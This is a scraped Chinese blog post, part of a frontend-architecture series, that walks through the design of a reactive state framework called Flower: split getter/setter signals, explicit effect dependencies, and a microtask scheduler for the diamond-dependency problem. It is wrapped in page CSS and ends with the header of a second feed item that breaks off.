.35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>写在前面</strong></p>
<p>这是《前端像架构突围 - 框架设计》系列的最终章。
我们不专门去说框架、聊响应式, 我们去学思想、看更上层的东西。</p>
<p>在前六章，我们聊了面向对象的本质、开闭原则的威力、以及接口职责的隔离。如果说那些是“内功心法”，那么今天我们要聊的，就是如何铸造一把趁手的“兵器”。</p>
<p>我们将从零开始构思一个名为 <strong>Flower</strong> 的反应式框架。</p>
<p>但请注意，这<strong>不是</strong>一篇“教你写 Vue 响应式原理”的教程。相反，这是一次关于**“反思”**的旅程。我们要探讨的是：当自动挡的反应式系统在复杂业务中失控时，我们该如何通过架构设计，找回丢失的控制权。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、 引言：对“魔法”的恐惧</h2>
<p>在写这一章之前，我其实犹豫过一段时间。不是因为反应式编程有多难实现，而是因为——<strong>我太清楚它有多容易失控了</strong>。</p>
<p>在很多项目初期，反应式系统简直是天使：状态一改，视图自动更新，逻辑看起来干净又优雅。我们沉浸在 <code>v-model</code> 或 <code>useEffect</code> 的便利中，享受着“声明式编程”的红利。</p>
<p>但当状态从 10 个变成 100 个，当依赖关系像蜘蛛网一样交织，当业务逻辑开始变得诡谲多变时，你会慢慢发现，那个曾经乖巧的系统开始“反噬”了：</p>
<ul>
<li><strong>幽灵更新</strong>：改了一个看似无关的字段，为什么会导致半个页面重渲染？</li>
<li><strong>调试黑洞</strong>：数据流像一团乱麻，打断点都不知道该打在哪里，只能靠 <code>console.log</code> 碰运气。</li>
<li><strong>心智负担</strong>：新人不敢动核心状态，因为“它好像被很多地方依赖了，但我不知道具体是哪”。</li>
</ul>
<p>这时候你会意识到：<strong>系统并不是在“响应变化”，而是在被变化牵着走。</strong></p>
<p>Flower 的设计，正是从这种不安感开始的。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4b125704d2046e6ba404e597f8a3715~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768896173&amp;x-signature=yeuPf%2FrJzbIx%2Fgnvb7YPyalQNX0%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">二、 核心定义：Flower 的边界</h2>
<p>如果只是实现一个简单的反应式库，网上有无数个版本的 <code>Object.defineProperty</code> 或 <code>Proxy</code> 教程。</p>
<p>但架构师的职责不是“实现功能”，而是**“划定边界” <strong>。在设计 Flower 之初，我做的第一个决策不是它“要有什么”，而是它</strong>“不要什么”**。</p>
<p>Flower <strong>不解决</strong>以下问题：</p>
<ul>
<li>UI 如何渲染（那是 React/Vue 的事）</li>
<li>组件如何生命周期管理</li>
<li>路由与网络请求</li>
</ul>
<p>Flower <strong>只解决</strong>一个核心命题：</p>
<ul>
<li><strong>变化管理</strong>：变化从哪里产生？它如何有序地流向需要它的地方？</li>
</ul>
<p>这是一个刻意“做小”的决策。因为我越来越确信：<strong>反应式系统一旦什么都想管（比如把 HTTP 请求也裹进响应式里），最终就会变成一团难以维护的泥球。</strong></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1ae483942164c96ab82a7e29399e575~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768896173&amp;x-signature=JaV7JuEWfnjL2QdhJUz%2BJUdVPHU%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">三、 设计决策 A：状态不是对象，而是“责任”</h2>
<p>在很多主流框架中，状态（State）通常被建模为一个普通对象（Object）。</p>
<pre><code class="hljs language-ini" lang="ini">// 常见的做法
const <span class="hljs-attr">state</span> = reactive({ count: <span class="hljs-number">0</span> })<span class="hljs-comment">;</span>
state.count++<span class="hljs-comment">; // 既是读取，又是修改，还是触发器</span>
</code></pre>
<p>对象很方便，但它违反了我们之前提到的 <strong>SRP（单一职责原则）</strong> 。一个简单的对象属性，同时承担了“数据容器”、“读取接口”、“写入接口”和“变化通知”四个职责。</p>
<p>在 Flower 中，我决定<strong>剥夺状态的“对象身份”</strong> 。</p>
<p>我们将状态设计为<strong>原子信号（Atom Signal）</strong> ，并强制分离<strong>读写权限</strong>。这其实是 <strong>CQS（命令查询职责分离）</strong> 在前端的一次微观落地。</p>
<h3 data-id="heading-3">工程实现：</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Flower 的设计风格</span>
const <span class="hljs-selector-attr">[count, setCount]</span> = <span class="hljs-built_in">createSignal</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// count() -&gt; 这是一个 Getter，只负责读取和依赖收集</span>
<span class="hljs-comment">// setCount() -&gt; 这是一个 Setter，只负责写入和通知更新</span>
</code></pre>
<p>为什么要这么麻烦？</p>
<p>因为这带来了**“引用透明性”**。</p>
<ul>
<li>如果你拿到的是 <code>count</code>，我知道你只能读，绝不可能悄悄修改它导致 Bug。</li>
<li>如果你拿到了 <code>setCount</code>，我知道你是“生产者”，你要对变化负责。</li>
</ul>
<p>通过 API 的设计，我们在代码层面强行约束了开发者的行为。<strong>这不是限制，这是保护。</strong></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75d15c9fce3348eba4d921f1b6a3e4f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768896173&amp;x-signature=KvL5uR2UdjX9CIYuco89k6oxjeo%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">四、 设计决策 B：拒绝“隐式依赖”的诱惑</h2>
<p>自动依赖收集（Auto-Dependency Collection）是现代前端框架最迷人的“魔法”。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 魔法：你没写任何订阅代码，但它就是工作了</span>
<span class="hljs-built_in">effect</span>(() =&gt; {
  console<span class="hljs-selector-class">.log</span>(state.name); <span class="hljs-comment">// 自动收集了 state.name 的依赖</span>
});
</code></pre>
<p>它确实好用，但在复杂工程中，我越来越警惕这种“悄悄发生的事情”。当依赖是隐式的，你就很难回答： <strong>“为什么这个函数执行了？”</strong></p>
<p>Flower 在这里做了一个极其<strong>保守</strong>，甚至可以说“反潮流”的选择：<strong>显式依赖（Explicit Dependency）</strong> 。</p>
<p>我们参考了 <strong>DIP（依赖倒置原则）</strong> 的思想：<strong>高层逻辑不应该依赖于“运行时悄悄发生的读操作”，而应该依赖于“明确声明的契约”。</strong></p>
<h3 data-id="heading-5">工程实现：</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Flower 的设计风格：你需要告诉我你关心什么</span>
<span class="hljs-title function_">effect</span>(
  <span class="hljs-comment">// 1. 显式声明依赖列表（像 React 的 deps 数组，但更严格）</span>
  [count, name], 
  <span class="hljs-comment">// 2. 回调函数，参数即为依赖的当前值</span>
  <span class="hljs-function">(<span class="hljs-params">currentCount, currentName</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Update: <span class="hljs-subst">${currentCount}</span>, <span class="hljs-subst">${currentName}</span>`</span>);
  }
);
</code></pre>
<p>这种设计看起来“没那么聪明”，甚至有点啰嗦。但它换来的是<strong>确定性</strong>。</p>
<p>在 Code Review 时，我看一眼依赖列表，就知道这个 Effect 会被什么触发。这种<strong>可推理性（Reasonability）</strong> ，在维护三年以上的老项目时，比什么魔法都珍贵。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9d78dfb5ba14ff29d7528e869f0a4cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768896173&amp;x-signature=87fNCYojNmTjAzxxuDKkD4%2FaYfI%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">五、 设计决策 C：调度器——解决“菱形依赖”难题</h2>
<p>很多手写的反应式库（Toy Implementation）都会遇到一个经典 Bug： <strong>“闪烁”或“过渡态”</strong> 。</p>
<p>想象一下：<code>A</code> 变了，<code>B</code> 依赖 <code>A</code>，<code>C</code> 依赖 <code>A</code>，而 <code>D</code> 同时依赖 <code>B</code> 和 <code>C</code>。 当 <code>A</code> 更新时，<code>D</code> 可能会被触发两次（一次来自 B 的路径，一次来自 C 的路径），甚至在第一次触发时读到不一致的数据。这就是著名的 <strong>“菱形依赖问题” (Diamond Problem)</strong> 。</p>
<p>这就是为什么我说：“更新机制不是性能问题，而是正确性问题。”</p>
<p>Flower 引入了一个核心模块：<strong>调度器 (Scheduler)</strong> 。</p>
<h3 data-id="heading-7">工程实现：</h3>
<p>调度器的核心逻辑是**“推-拉结合” (Push-Pull)**：</p>
<ol>
<li><strong>Push 阶段</strong>：当信号变化时，不立即执行回调，而是标记所有脏节点（Dirty Marking）。</li>
<li><strong>Pull 阶段</strong>：在微任务（Microtask）队列中，按照拓扑排序（Topological Sort）的顺序，一次性计算出最终状态。</li>
</ol>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 简化的调度逻辑</span>
let dirtyQueue = new <span class="hljs-built_in">Set</span>();

function <span class="hljs-built_in">schedule</span>(effect) {
  dirtyQueue<span class="hljs-selector-class">.add</span>(effect);
  <span class="hljs-comment">// 利用 Promise.resolve() 延迟到微任务执行</span>
  <span class="hljs-built_in">queueMicrotask</span>(flush);
}

function <span class="hljs-built_in">flush</span>() {
  <span class="hljs-comment">// 在这里进行排序、去重、批量执行</span>
  <span class="hljs-comment">// 确保 D 只会执行一次，且是在 B 和 C 都更新完之后</span>
}
</code></pre>
<p>通过引入调度层，Flower 保证了：<strong>每一次更新，都是系统达到“稳定态”后的结果。</strong> 中间过程的动荡，被框架内部消化了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c528a8ee18924fd88ee31bfd25e2bbd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768896173&amp;x-signature=HHDPJOSrxrvaagP0cS0VLdB45ZI%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-8">六、 删繁就简：Flower 到底剩下了什么？</h2>
<p>在设计过程中，我不断地问自己： <strong>“如果把 Flower 一层层剥开，删到不能再删，它还剩下什么？”</strong></p>
<p>最后留下的，其实只有三个核心概念，它们构成了 Flower 的骨架：</p>
<ol>
<li><strong>Signal (信号源)</strong> ：负责定义数据和权限。</li>
<li><strong>Derive (计算属性)</strong> ：负责数据的转换与派生。</li>
<li><strong>Effect (副作用)</strong> ：负责与外部世界（如 DOM、日志）交互。</li>
</ol>
<p>没有复杂的 Class，没有难以理解的配置对象，没有黑魔法。</p>
<p>这让我再次确认了一个架构真理：<strong>框架的价值，不在于提供了多少能力，而在于它限制了多少可能性。</strong></p>
<p>Flower 限制了你随意修改状态的权力，限制了你隐式建立依赖的自由，但它给予了你**“系统无论怎么变，依然尽在掌握”**的安全感。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17318733c03e4170bd609fa7d7f21880~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768896173&amp;x-signature=aMMmfKD6lH5q2lCqNOG%2FCv920u0%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-9">七、 结语：从“术”到“道”</h2>
<p>回顾《前端向架构突围》的第二章，我们从面向对象的“类与继承”，一路走到设计原则的“SOLID”，最后落地到 Flower 框架的设计。</p>
<p>如果你仔细回味，会发现 Flower 的每一个设计决策，都是前面那些枯燥原则的<strong>投影</strong>：</p>
<ul>
<li><strong>createSignal</strong> 是 <strong>单一职责原则</strong> 的体现。</li>
<li><strong>显式依赖</strong> 是 <strong>依赖倒置原则</strong> 的落地。</li>
<li><strong>不可变接口</strong> 是 <strong>接口隔离原则</strong> 的实践。</li>
</ul>
<p>架构设计并不是在追求“更聪明的算法”或“更短的代码”，而是在复杂的业务洪流面前，你是否愿意为系统设下<strong>清晰而坚定</strong>的边界。</p>
<p>反应式编程只是一个切入口。真正重要的，是你如何面对“变化”本身。</p>
<p>至此，框架设计篇章暂告一段落。但我们的突围之路才刚刚开始。在接下来的章节中，我们将走出代码的微观世界，去挑战更为宏大的<strong>工程化体系</strong>。</p>
<blockquote>
<p><strong>互动思考：</strong> 在你的项目中，是否遇到过“不知道为什么这个组件又重新渲染了”的崩溃时刻？如果让你重新设计，你会更倾向于 Vue 的“自动收集”还是 React 的“显式依赖”？为什么？</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用第一性原理拆解 Agentic Coding：从理论到实操（下）]]></title>    <link>https://juejin.cn/post/7594627998838865962</link>    <guid>https://juejin.cn/post/7594627998838865962</guid>    <pubDate>2026-01-13T02:16:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594627998838865962" data-draft-id="7594627998838816810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用第一性原理拆解 Agentic Coding：从理论到实操（下）"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2026-01-13T02:16:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用第一性原理拆解 Agentic Coding：从理论到实操（下）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:16:48.000Z" title="Tue Jan 13 2026 02:16:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img 